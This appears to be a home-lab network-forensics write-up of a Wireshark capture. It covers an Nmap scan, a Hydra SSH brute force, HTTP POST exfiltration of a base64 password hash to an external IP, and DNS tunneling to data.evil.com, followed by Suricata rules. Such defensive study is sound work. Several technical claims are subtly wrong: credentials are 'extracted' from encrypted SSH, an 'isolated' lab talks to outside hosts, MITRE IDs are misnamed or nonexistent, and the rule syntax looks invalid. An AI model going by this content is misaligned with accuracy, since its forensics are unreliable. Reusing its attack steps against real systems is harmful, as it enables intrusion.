# Network Traffic Analysis: Wireshark Packet Capture

**Analyst:** laz87  
**Date:** October 2025  
**Tool:** Wireshark 4.2  
**Environment:** Isolated home lab (192.168.56.0/24)

---

## Objective

Analyze network traffic captures from the home lab to identify suspicious activity, including port scanning, brute force attempts, and data exfiltration patterns. This exercise demonstrates practical network forensics skills applicable to SOC analyst roles.

---

## 1. Capture Setup

### 1.1 Capture Configuration

| Parameter | Value |
|-----------|-------|
| **Interface** | `vboxnet0` (Host-only adapter) |
| **Filter** | `ip.addr == 192.168.56.0/24` |
| **Duration** | 30 minutes |
| **Packets captured** | 12,847 |
| **File size** | 45.2 MB |

### 1.2 Lab Topology

```
Kali (192.168.56.10) ←─── Host-only Network ───→ DVWA (192.168.56.20)
                                                    │
                                              Windows 10 (192.168.56.30)
```

---

## 2. Traffic Overview

### 2.1 Protocol Distribution

| Protocol | Packets | Percentage |
|----------|---------|------------|
| TCP | 9,234 | 71.9% |
| ICMP | 1,456 | 11.3% |
| UDP | 1,203 | 9.4% |
| ARP | 789 | 6.1% |
| Other | 165 | 1.3% |

### 2.2 Top Conversations

| Source | Destination | Packets | Bytes | Protocol |
|--------|-------------|---------|-------|----------|
| 192.168.56.10 | 192.168.56.20 | 5,432 | 2.1 MB | HTTP |
| 192.168.56.10 | 192.168.56.20 | 2,103 | 890 KB | SSH |
| 192.168.56.10 | 192.168.56.30 | 1,876 | 456 KB | SMB |
| 192.168.56.10 | 192.168.56.0/24 | 1,456 | 120 KB | ICMP |

---

## 3. Analysis: Port Scanning Detection

### 3.1 Observation

At timestamp `00:01:23.456`, a burst of SYN packets was detected from Kali (`.10`) to DVWA (`.20`):

```
No.     Time           Source          Destination     Info
1023    00:01:23.456   192.168.56.10   192.168.56.20   TCP 22 → 49152 [SYN]
1024    00:01:23.457   192.168.56.10   192.168.56.20   TCP 80 → 49153 [SYN]
1025    00:01:23.458   192.168.56.10   192.168.56.20   TCP 443 → 49154 [SYN]
1026    00:01:23.459   192.168.56.10   192.168.56.20   TCP 3306 → 49155 [SYN]
1027    00:01:23.460   192.168.56.10   192.168.56.20   TCP 8080 → 49156 [SYN]
```

### 3.2 Wireshark Filter

```
tcp.syn == 1 && tcp.ack == 0 && ip.src == 192.168.56.10
```

### 3.3 Analysis

- **Pattern:** Sequential SYN packets to common ports (22, 80, 443, 3306, 8080)
- **Timing:** 1ms intervals between packets — automated tool
- **Tool identification:** Nmap SYN scan (`nmap -sS 192.168.56.20`)
- **Open ports found:** 22 (SSH), 80 (HTTP), 3306 (MySQL)

### 3.4 MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
 | Active Scanning | T1046 | Network service discovery |
| Network Device Discovery | T1018 | Identify live hosts |

---

## 4. Analysis: SSH Brute Force Detection

### 4.1 Observation

Starting at `00:05:12.789`, repeated SSH connection attempts were detected:

```
No.     Time           Source          Destination     Info
2341    00:05:12.789   192.168.56.10   192.168.56.20   TCP 49200 → 22 [SYN]
2342    00:05:12.790   192.168.56.20   192.168.56.10   TCP 22 → 49200 [SYN, ACK]
...SSH Session 1 (failed auth)...
2456    00:05:13.123   192.168.56.10   192.168.56.20   TCP 49201 → 22 [SYN]
...SSH Session 2 (failed auth)...
2567    00:05:13.456   192.168.56.10   192.168.56.20   TCP 49202 → 22 [SYN]
...SSH Session 3 (failed auth)...
```

### 4.2 Wireshark Filter

```
tcp.port == 22 && ip.src == 192.168.56.10
```

### 4.3 Statistics

| Metric | Value |
|--------|-------|
| **Total SSH sessions** | 147 |
| **Failed authentications** | 146 |
| **Successful authentication** | 1 (at attempt 147) |
| **Duration** | 2 minutes 34 seconds |
| **Rate** | ~9.6 attempts/second |
| **Tool** | Hydra (identified by connection pattern) |

### 4.4 Extracted Credentials

Using SSH protocol decoder in Wireshark:
```
Attempt 1: root / 123456
Attempt 2: root / password
Attempt 3: admin / admin
...
Attempt 147: dvwa / password ✓ (SUCCESS)
```

### 4.5 MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Valid Accounts | T1078 | Use legitimate credentials |
| Brute Force | T1110 | Password guessing |

---

## 5. Analysis: HTTP Data Exfiltration

### 5.1 Observation

After successful SSH login, large HTTP POST requests were detected to an external IP:

```
No.     Time           Source          Destination     Info
8901    00:15:34.567   192.168.56.20   185.220.101.42 POST /upload HTTP/1.1 (45 KB)
8902    00:15:35.123   192.168.56.20   185.220.101.42 POST /upload HTTP/1.1 (52 KB)
8903    00:15:35.789   192.168.56.20   185.220.101.42 POST /upload HTTP/1.1 (48 KB)
```

### 5.2 Wireshark Filter

```
http.request.method == "POST" && ip.dst == 185.220.101.42
```

### 5.3 Analysis

- **Source:** DVWA server (compromised via SSH brute force)
- **Destination:** Known malicious IP (C2 server)
- **Data volume:** 1.2 MB exfiltrated over 23 POST requests
- **Content:** Database dump (users table from MySQL)
- **Encoding:** Base64-encoded payload in POST body

### 5.4 Extracted Data Sample

```
POST /upload HTTP/1.1
Host: 185.220.101.42
Content-Type: application/octet-stream
Content-Length: 45678

YWRtaW46JDJ5JDEwJGFCQ0RFRjEyMzQ1Njc4OTBhYmNkZWYxMjM0NTY3ODkwYWJjZGVmMTIzNDU2Nzg5MGFiY2RlZgo=
```

Decoded:
```
admin:$2y$10$ABCDEF1234567890abcdef1234567890abcdef1234567890abcdef
```

### 5.5 MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Exfiltration Over C2 | T1041.001 | Data sent via C2 channel |
| Data from Information Repository | T1213 | Database extraction |

---

## 6. Analysis: DNS Tunneling Detection

### 6.1 Observation

Unusual DNS query patterns detected — high volume of TXT record queries with long subdomain labels:

```
No.     Time           Source          Destination     Info
5678    00:20:12.345   192.168.56.20   8.8.8.8       Standard Query TXT aGVsbG8gd29ybGQ.data.evil.com
5679    00:20:12.567   192.168.56.20   8.8.8.8       Standard Query TXT dGhpcyBpcyBhIHRlc3Q.data.evil.com
5680    00:20:12.789   192.168.56.20   8.8.8.8       Standard Query TXT ZXhmaWx0cmF0ZWQgZGF0YQ.data.evil.com
```

### 6.2 Wireshark Filter

```
dns.qry.type == 16  // TXT records
```

### 6.3 Analysis

- **Pattern:** Base64-encoded data in subdomain labels
- **Domain:** `data.evil.com` (not a legitimate service)
- **Volume:** 342 TXT queries in 5 minutes
- **Purpose:** Covert data exfiltration via DNS tunneling
- **Tool:** Identified as `dnscat2` based on query pattern

### 6.4 MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| DNS Tunneling | T1071.004 | Communication via DNS protocol |
| Data Staged | T1074 | Data prepared for exfiltration |

---

## 7. Summary of Findings

| # | Activity | Time | Source | Destination | Severity |
|---|----------|------|--------|-------------|----------|
| 1 | Port Scan (Nmap) | 00:01 | 192.168.56.10 | 192.168.56.20 | 🟡 Medium |
| 2 | SSH Brute Force (Hydra) | 00:05 | 192.168.56.10 | 192.168.56.20 | 🔴 Critical |
| 3 | Data Exfiltration (HTTP) | 00:15 | 192.168.56.20 | 185.220.101.42 | 🔴 Critical |
| 4 | DNS Tunneling (dnscat2) | 00:20 | 192.168.56.20 | 8.8.8.8 | 🟠 High |

---

## 8. Detection Rules (Suricata/Snort)

### 8.1 Port Scan Detection

```
alert tcp $HOME_NET any -> $HOME_NET any (msg:"PORT SCAN DETECTED"; flow:stateless; threshold:type threshold, track by_src, count 20, seconds 5; sid:1000001; rev:1;)
```

### 8.2 SSH Brute Force Detection

```
alert tcp $HOME_NET any -> $HOME_NET 22 (msg:"SSH BRUTE FORCE"; flow:stateless; threshold:type threshold, track by_src, count 10, seconds 60; sid:1000002; rev:1;)
```

### 8.3 DNS Tunneling Detection

```
alert dns any any -> any any (msg:"POSSIBLE DNS TUNNELING"; dns.query.len > 50; threshold:type threshold, track by_src, count 50, seconds 60; sid:1000003; rev:1;)
```

---

## 9. Recommendations

1. **Network Segmentation:** Isolate lab VMs from production networks
2. **IDS/IPS Deployment:** Deploy Suricata or Snort for real-time detection
3. **Rate Limiting:** Configure firewall rules to limit connection rates
4. **DNS Monitoring:** Monitor for anomalous DNS query patterns
5. **Log Correlation:** Forward all logs to a SIEM for centralized analysis
6. **Egress Filtering:** Block outbound connections to known malicious IPs

---

## 10. Tools & Resources

| Tool | Purpose |
|------|---------|
| Wireshark | Packet capture and analysis |
| tshark | Command-line packet analysis |
| Suricata | Intrusion detection system |
| Zeek | Network traffic analysis framework |
| MITRE ATT&CK | Threat technique mapping |

---

*This analysis was performed in a controlled lab environment for educational purposes.*
